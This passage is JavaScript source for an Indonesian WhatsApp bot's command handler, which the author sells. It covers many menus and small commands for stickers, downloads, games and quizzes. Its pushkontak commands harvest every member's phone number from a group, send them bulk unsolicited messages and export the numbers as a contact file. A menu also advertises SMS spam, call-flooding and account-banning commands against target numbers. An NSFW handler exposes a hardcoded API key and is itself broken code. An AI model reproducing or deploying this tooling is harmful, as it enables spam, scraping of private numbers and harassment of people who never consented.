 ⨠ *Add (628xx)*
 ⨠ *Group close / open*
 ⨠ *Promote (628xx)*
 ⨠ *Demote (628xx)*
 ⨠ *Sendlinkgc (628xx)*
 ⨠ *Editgroup close / open*
 ⨠ *Editinfo on / off*
 ⨠ *Join (linknya)*
 ⨠ *Editsubjek (textnya)*
 ⨠ *Editdesk (textnya)*
 ⨠ *Tagall (textnya)*
 ⨠ *Inspect (linknya)*
 ⨠ *Linkgroup*
 ⨠ *Resetlinkgc*
 ⨠ *Buatsw*
 ⨠ *Buatswimage*
 ⨠ *Buatswvideo*
 ⨠ *Swin*
 ⨠ *Vnsw*
 ⨠ *Buatswptv*
 ⨠ *Toptv*
 ⨠ *Buatsws*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'downmenu': case 'downloadmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Download Menu*
⨠ *Igdl (linknya)*
⨠ *Igslide (linknya)*
⨠ *Tiktok (linknya)*
⨠ *Ttslide (linknya)*
⨠ *Ytmp3 (linknya)*
⨠ *Ytmp4 (linknya)*
⨠ *Mediafire (linknya)*


▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'favmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Favorite Menu*
⨠ *Ai*
⨠ *Wm*
⨠ *S*
⨠ *Hd*
⨠ *Pin*
⨠ *Smeme*
⨠ *Play*
⨠ *Toimg*
⨠ *Remini*
⨠ *Animediff*
⨠ *Ig (Linknya)*
⨠ *Tiktok (Linknya)*
⨠ *Ttsearch (Teks)*
⨠ *Ytmp3 (Linknya)*
⨠ *Ytmp4 (Linknya)*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'menunsfwmode34': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Nsfw Menu* 🤐
⨠ *Yuri*
⨠ *Cum*
⨠ *Ero*
⨠ *Ass*
⨠ *Neko2*
⨠ *Okita*
⨠ *Umeko*
⨠ *Panties*
⨠ *Mihye*
⨠ *Merial*
⨠ *Quan*
⨠ *Nanaqi*
⨠ *Onlyfans*
⨠ *Onlyhestia*
⨠ *Nguyenhuang*
⨠ *Onlynoname*
⨠ *Hentaivid*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'panelmenu2443417': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Panel Menu*
⨠ *Addpanel*
⨠ *Listusr*
⨠ *Delusr*
⨠ *Listsrv*
⨠ *Delsrv*
⨠ *Ramlist*
⨠ *Addusr*
⨠ *Addsrv*
⨠ *Crateadmin*
⨠ *Listadmin*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'convertmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Convert Menu*
⨠ *Wm*
⨠ *Nobg*
⨠ *Toimage*
⨠ *Tomp3*
⨠ *Togif*
⨠ *Tourl*
⨠ *Smeme*
⨠ *Colorize*
⨠ *Attp (textnya)*
⨠ *Ttp (textnya)*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case "pushkonmenu": {
if (isBan) return reply('*Kamu Di Ban Owner*')
const y11 = `▢ *PUSH KONTAK OTOMATIS*
⨠ *cekidgc*
⨠ *pushkontakv1*
⨠ *pushkontakv2*
⨠ *savecontact*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`
reply(y11)
}
break

case 'randommenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Random Menu*
⨠ *Afk*
⨠ *Owner*
⨠ *Nickff*
⨠ *Puisi*
⨠ *Pantun*
⨠ *Sticker*
⨠ *Sewa*
⨠ *Faktaunik*
⨠ *Couple*
⨠ *Meme*
⨠ *Getname*
⨠ *Getpic*
⨠ *Stalktiktok*
⨠ *Qc*
⨠ *Qcstick*
⨠ *Lirik*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'domainmenu':{
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Domain Menu*
⨠ *Untuk Saat Ini Owner Tidak Menjual Domain* 😥

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'aimenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Ai Menu*
⨠ *Ai*
⨠ *Ask*
⨠ *Play*
⨠ *Song*
⨠ *Aimage*
⨠ *OpenAi*
⨠ *Remini*
⨠ *Pinterest*
⨠ *Animediff*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'searchmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Search Menu*
⨠ *Ai*
⨠ *Play*
⨠ *Song*
⨠ *Jarak*
⨠ *Google*
⨠ *OpenAi*
⨠ *Ytsearch*
⨠ *Infogempa*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'gassmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Gass Menu*
⨠ *Sc*
⨠ *Autoread on/off*
⨠ *Getdb (database)*
⨠ *Getuser (database user)*
⨠ *Setppbot*
⨠ *Setppgroup*
⨠ *Block*
⨠ *Unblock*
⨠ *Spamsms (628xx)*
⨠ *Call (628xx)*
⨠ *Kenon (628xx)*
⨠ *Verif@ (628xx)*
⨠ *Banned (628xx)*
⨠ *Createqr*
⨠ *Unbannedv2 (628xx)*
⨠ *Unbannedv3 (628xx)*
⨠ *Unbannedv4 (628xx)*
⨠ *Unbannedv5 (628xx)*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'databasemenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Database Menu*
⨠ *Setcmd*
⨠ *Delcmd*
⨠ *Listcmd*
⨠ *Setppbot*
⨠ *Addpdf*
⨠ *Delpdf*
⨠ *Listpdf*
⨠ *Yopdf*
⨠ *Sendpdf*
⨠ *Addzip*
⨠ *Delzip*
⨠ *Listzip*
⨠ *Yozip*
⨠ *Sendzip*
⨠ *Addapk*
⨠ *Delapk*
⨠ *Listapk*
⨠ *Yoapk*
⨠ *Sendapk*
⨠ *Addvn*
⨠ *Delvn*
⨠ *Listvn*
⨠ *Addmsg*
⨠ *Sendlist*
⨠ *Listmsg*
⨠ *Delmsg*
⨠ *Getmsg*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'weebsmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Weebs Menu*
⨠ *Pat*
⨠ *Cry*
⨠ *Hug*
⨠ *Nom*
⨠ *Awoo*
⨠ *Kiss*
⨠ *Kill*
⨠ *Lick*
⨠ *Bite*
⨠ *Yeet*
⨠ *Bonk*
⨠ *Wink*
⨠ *Poke*
⨠ *Slap*
⨠ *Bully*
⨠ *Smile*
⨠ *Wave*
⨠ *Blush*
⨠ *Smug*
⨠ *Glomp*
⨠ *Happy*
⨠ *Dance*
⨠ *Cuddle*
⨠ *Cringe*
⨠ *Highfive*
⨠ *Handhold*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'beritamenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Berita Menu*
⨠ *Inews*
⨠ *Kontan*
⨠ *KompasNews*
⨠ *DetikNews*
⨠ *DailyNews*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'quotesmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Quotes Menu*
⨠ *FML*
⨠ *Bucin*
⨠ *Quotes*
⨠ *Motivasi*
⨠ *Katabijak*
⨠ *Katacinta*
⨠ *Katagalau*
⨠ *Katahacker*
⨠ *Katailham*
⨠ *Katasenja*
⨠ *Katasindiran*
⨠ *Quotesanime*
⨠ *Quotespubg*
⨠ *Quotesislamic*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'gamemenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Game Menu*
⨠ *TTC*
⨠ *Deltc*
⨠ *Tebak Kata*
⨠ *Tebak Gambar*
⨠ *Tebak Lirik*
⨠ *Tebak Kalimat*
⨠ *Tebak Lagu*
⨠ *Tebak Lontong*
⨠ *Kuismath Noob*
⨠ *Kuismath Easy*
⨠ *Kuismath Medium*
⨠ *Kuismath Hard*
⨠ *Kuismath Extreme*
⨠ *Kuismath Imposibble*
⨠ *Kuismath Imposibble2*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case "hoyomenu2443417": {
if (isBan) return reply('*Kamu Di Ban Owner*')
const y14 = `▢ *Hoyoverse Guide*
⨠ *Enka*
⨠ *Build / Buildgi*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`
reply(y14)
}
break

case 'funmenu': {
if (isBan) return reply('*Kamu Di Ban Owner*')
LenwyLD()
await sleep(1000)
reply(`▢ *Fun Menu*
⨠ *Truth*
⨠ *Dare*
⨠ *Rate*
⨠ *Apakah*
⨠ *Kapankah*
⨠ *Bisakah*
⨠ *Bagaimanakah* 
⨠ *Gantengcek*
⨠ *Cekganteng*
⨠ *Cantikcek*
⨠ *Cekcantik*
⨠ *Sangecek*
⨠ *Ceksange*
⨠ *Gaycek*
⨠ *Cekgay*
⨠ *Lesbicek*
⨠ *Ceklesbi*

▢ *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'help': {
reply(`❄️️ *Panduan Untuk Menggunakan Fitur Bot*

*#1 Membuat Sticker Whatsapp*
*#2 Mengubah Sticker Menjadi Gambar*
*#3 Mengubah Watermark Sticker*
*#4 Meningkatkan Kualitas Gambar*
*#5 Mengunduh Foto/Video Dari Link*
*#6 Mengunduh Audio/Video Youtube*
*#7 Mengunduh Lagu/Musik*
*#8 Bertanya Kepada Bot*
*#9 Mencari Berita*
*#10 Mengubah Gambar Menjadi Link*
*#11 Mengetahui Jarak Kota*

🎁 *Untuk Menampilkan Panduan Ketik Sesuai Nomor, Contoh : NO1* 

🎁 *Kalo Ada Error Bisa Chat Owner Ya* 😄
`)
}
break

case 'no1': {
reply(`❄️️ *Membuat Sticker Whatsapp*

🎁 *Untuk Membuat Sticker Whatsapp Kirim Foto/Video Dengan Caption S, Stiker, Sticker*
🎁 *Untuk Membuat Sticker Dengan Caption Gunakan Smeme : Contoh Smeme Lenwy*`)
}
break

case 'no2': {
reply(`❄️️ *Membuat Sticker Menjadi Gambar*

🎁 *Untuk Membuat Sticker Menjadi Gambar Reply Sticker Dengan Mengetik Toimg*`)
}
break

case 'no3': {
reply(`❄️️ *Mengubah Watermark Sticker*

🎁 *Untuk Mengubah Watermark Sticker Reply Sticker Dengan Mengetik : Wm (Teks)*
🎁 *Contoh : Wm Lenwy*`)
}
break

case 'no4': {
reply(`❄️️ *Meningkatkan Kualitas Gambar*

🎁 *Untuk Meningkatkan Kualitas Gambar Kirim Gambar/Foto Dengan Caption Hd, Remini*`)
}
break

case 'no5': {
reply(`❄️️ *Mengunduh Foto/Video Dari Link*

🎁 *Untuk Mengunduh Foto/Video Dari Link Ketik : Tiktok (Link Tiktok)*
🎁 *Lebih Lengkapnya Ketik Downmenu*

⚠️ *Pastikan Link Sesuai Dengan Perintah*`)
}
break

case 'no6': {
reply(`❄️️ *Mengambil Audio/Video Dari Youtube*

🎁 *Untuk mengambil Audio/Video Dari Youtube Ketik : Ytmp4 (Link)*
🎁 *Ytmp3 Untuk Audio | Ytmp4 Untuk Video*

⚠️ *Audio/Video Lebih Dari 5 Menit Kemungkinan Gagal Dikirim*`)
}
break

case 'no7': {
reply(`❄️️ *Mengunduh Lagu/Musik*

🎁 *Untuk Mengunduh Lagu ketik : Play (Nama Lagu)*
🎁 *Contoh : Play Boa - Duvet*`)
}
break

case 'no8': {
reply(`❄️️ *Bertanya Kepada Bot*

🎁 *Untuk Bertanya kepada Bot Ketik : Ai (Pertanyaan)*
🎁 *Contoh : Ai Sejarah Indonesia*`)
}
break

case 'no9': {
reply(`❄️️ *Mencari Berita*

🎁 *Untuk Mencari Berita Ketik : Inews*
🎁 *Lebih Lengkapnya Ketik Beritamenu`)
}
break

case 'no10': {
reply(`❄️️ *Mengubah Gambar Menjadi Link*

🎁 *Untuk Mengubah Gambar Menjadi Link Kirim Gmbar Dengan caption Tourl*`)
}
break

case 'no11': {
reply(`❄️️ *Mengetahui Jarak Kota*

🎁 *Untuk Mengetahui Jarak Kota ketik : Jarak (Nama Kota)|(Nama Kota)*
🎁 *Contoh : Jarak Bandung|Jakarta*`)
}
break

case 'sc':
case 'script': {
let buy = `❄️️ *Script Bot ©Project Kamiya汉 V3 : 20K*
❄️️ *No Enc, Free Apikey, Pairing Code*
❄️️ *Males Edit? Nambah 5K Aja ^_^*

🎁 *Beli? : wa.me/6283829102407*
`
lenwy.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 20000000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: buy,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
}
break

case 'bot': {
reply(`❄️️ *Bot ©Project Kamiya汉 V3 Aktif*
🎁 *Author : wa.me/6283829102407*`)
}
break

case 'Kamiya': {
reply(`🍁 *Link Sc ©Project Kamiya汉 V3 Ada Di Deskripsi : https://whatsapp.com/channel/0029VaEvOpP35fLtqPxd4F2L*`)
}
break

case 'malas': {
if (!isCreator) return 
const t3xt = require(`./database/teks/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
lenwy.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break

case "assalamu'alaikum": case 'assalamualaikum': {
reply(`❄️️ *Waalaikumussalam*`)
}
break

case 'p': {
reply(`❄️️ *Halo Ada Yang Bisa Kubantu?*`)
}
break

case "hi": case "hai": case "halo": case "hallo": case "helo": case "hello": case "haii": case "hii": case "hlo": case "haloo": case "hiii": {
reply(`❄️️ *Halo Juga*`)
}
break

case 'bokep': {
reply(`❄️️ *Haduhh Otak Mesum*`)
}
break

case 'infokan': case 'info': {
reply(`❄️️ *Halo Mau Cari Apa Nih?*

🎁 *Mau Beli Panel? Bisa Ketik Panel Buat Cek Harganya*

🎁 *Mau Beli Vps? Bisa Cek : https://ralvinstore.my.id/*`)
}
break

case 'panel': {
reply(`❄️️ *Halo Ini List Harga Panelnya Ya*

🎁 *Ram 1Gb - CPU 30% : 2K/Bulan*
🎁 *Ram 2Gb - CPU 50% : 5K/Bulan*
🎁 *Ram 3Gb - CPU 80% : 8K/Bulan*
🎁 *Ram 4Gb - CPU 100% : 10K/Bulan*
🎁 *Ram 5Gb - CPU 120% : 13K/Bulan*
💎 *Ram 1Gb - CPU UNLI : 15K/Bulan*

❄️️ *Mau Beli? Bisa Chat :*
 ⨠ *wa.me/62838291024077*
 ⨠ *wa.me/6283829102407*`)
}
break

case 'huft': {
if (!isCreator) return 
const t3xt = require(`./database/teks/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
lenwy.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break


case 'rate': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Penampilan Kamiya*`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`❄️️ *Rate : ${q}*\n🎁 *Jawaban : ${te}%*`)
}
break

case 'apakah': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya Marah*`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`❄️️ *Pertanyaan : Apakah ${q}*\n🎁 *Jawaban : ${kah}*`)
}
break

case 'kapankah': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya Marah*`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`❄️️ *Pertanyaan : Kapankah ${q}*\n🎁 *Jawaban : ${kapankah}*`)
}
break

case 'bisakah': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya Marah*`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Awokawok', 'TENTU KAMU PASTI BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`❄️️ *Pertanyaan : Bisakah ${q}*\n🎁 *Jawaban : ${ga}*`)
}
break

case 'bagaimanakah': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya Marah*`)
const gimana = ['Ya Begitulah', 'Gak Normal', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'Kayaknya Lanjut Part 2', 'Kepo Kamu', 'Gimana Aja']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`❄️️ *Pertanyaan : Bagaimanakah ${q}*\n🎁 *Jawaban : ${ya}*`)
}
break

case 'gantengcek': case 'cekganteng': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya*`)
const gan = ['Normal','Ganteng Njir','Ganteng Amat Bang','Jaga Penampilan Ya','Kurang :c','Lumayan','Boleh Juga']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`❄️️ *Nama ${q}*\n🎁 *Jawaban : ${teng}*`)
}
break

case 'cantikcek': case 'cekcantik': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya*`)
const can = ['Normal','Cantik Njir','Cantik Amat Sih','Jaga Penampilan Ya','Kurang :c','Lumayan','Boleh Juga']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`❄️️ *Nama ${q}*\n🎁 *Jawaban : ${tik}*`)
}
break

case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!q) return reply(`❄️️ *Contoh: ${prefix + command} Kamiya*`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`❄️️ *Nama : ${q}*\n🎁 *Jawaban : ${sange}%*`)
}
break

case'baka':case'smug':case'neko_sfw':case'hentai_gif':case'spank':case'blowjob':case'cumarts':case'eroyuri':case'eroneko':case'erokemonomimi':case'erokitsune':case'ero':case'feet':case'erofeet':case'feetgif':case'femdom':case'futanari':case'hentai':case'holoero':case'holo':case'keta':case'kitsune':case'kemonomimi':case'pussyart':case'pussywankgif':case'girl_solo':case'girl_solo_gif':case'tits':case'trap':case'yuri':case'avatar2':case'anal':case'bj':case'boobs':case'classic':case'cumsluts':case'kuni':case'lesbian':case'n':case'neko_gif':case'ahegao':case'bdsm':case'cuckold':case'cum':case'foot':case'gangbang':case'glasses':case'jahy':case'masturbation':case'nsfw_neko':case'orgy':case'panties':case'tentacles':case'thighs':case'zettai':{
                 
 if (!isPrem) return errorReply(mess.prem)
let memekhaha = await fetch(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=QIO8xicLNkEV43Y`)
reply(mess.wait)
await lenwy.sendMessage(from, { image: data, caption: `Nih ${command} Nya 😋`}, {quoted: m})
}
break


case "createqr": {
if (!isCreator) return reply('*Khusus Pemilik!*')
LenwyLD()
const qrcode = require('qrcode')
if (!text) return reply(`Penggunaan Salah Harusnya ${prefix+command} Kamiya`)
const qyuer = await qrcode.toDataURL(text, { scale: 8 })
let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
lenwy.sendMessage(from, { image: data, caption: `Sukses Kak` }, { quoted: m })
}
break
case "detectqr": {
if (!isCreator) return reply('*Khusus Pemilik!*')
LenwyLD()
try {
mee = await lenwy.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break

case "cekidgc": {
if (!isOwner) return reply(mess.owner)
let getGroups = await lenwy.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await lenwy.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case "pushkontakv1":
case "pv1":{
if (!isOwner) return reply(mess.owner)
if (m.isGroup) return reply(mess.private)
if (!text) return reply(`Command Salah Seharusnya Command ${prefix+command} *idgroup|tekspushkontak*\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
global.idgcns = text.split("|")[0]
global.tekspushkon = text.split("|")[1]
const groupMetadataa = !m.isGroup? await lenwy.groupMetadata(global.idgcns).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let mem of halls) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await lenwy.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await lenwy.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(2000)
} else {
await lenwy.sendMessage(mem, { text: global.tekspushkon })
await sleep(2000)
}
}
lenwy.sendMessage("6283829102407@s.whatsapp.net", {text:`❄️️ Sukses Bang...`})
}
break
case "pushkontakv2":
case "pv2":{
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
global.tekspushkonv2 = text
const groupMetadata = m.isGroup? await lenwy.groupMetadata(from).catch(e => {}) : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await lenwy.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await lenwy.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(3000)
} else {
await lenwy.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(3000)
}
}
lenwy.sendMessage("6283829102407@s.whatsapp.net", {text:`❄️️ Sukses Bang...`})
}
break
case "savecontact": {
if (!isOwner) return reply(mess.owner)
reply(mess.wait)
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA [${index}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await lenwy.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'public': {
if (!isCreator) return reply('*Khusus Premium*') 
lenwy.public = true
reply('Sukses Change To Public')
}
break

case 'self': {
if (!isCreator) return reply('*Khusus Premium*') 
lenwy.public = false
reply('Sukses Change To Self')
}
break

case 'enc': {
            if (!isCreator) return reply(mess.owner)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break

case 'addprem':
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283829102407`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await lenwy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Menjadi Premium!!!`)
break

case 'delprem':
if (!isCreator) return 
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283829102407`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break

case 'listprem':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooo = '▢ *List Premium*\n\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
lenwy.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

        case 'addseller':
 if (!isCreator) return reply(`Hadehh`)
        
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let cekbii = await lenwy.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekbii.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
bii.push(bnnd)
fs.writeFileSync('./data/db/anjay.json', JSON.stringify(bii))
reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break

        case 'delseller':
if (!isCreator) return reply('*Khusus Owner Bot*')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283829102407`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = bii.indexOf(yaki)
bii.splice(unp, 1)
fs.writeFileSync('./data/db/anjay.json', JSON.stringify(bii))
reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break

case 'listseller':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooo = '*List Seller*\n\n'
for (let i of bii) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${bii.length}*`
lenwy.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'ban':  {
if (!isCreator) return reply('*Khusus Premium*')
if (!args[0]) return reply(`*Contoh : ${command} add 6283829102407*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break

case 'listban':
if (isBan) return reply('*Lu Di Ban Owner*')
 teksooop = `▢ *List Ban*\n`
for (let ii of banned) {
teksooop += `   ⨠  ${ii}\n`
}
reply(teksooop)
break

case 'owner': case 'creator':{
 const repf = await lenwy.sendMessage(from, { 
contacts: { 
displayName: `${author}`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
lenwy.sendMessage(from, { text : `Halo @${sender.split("@")[0]}, Ini Nomor Ownerku Yaa 👌`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case 'domain': {
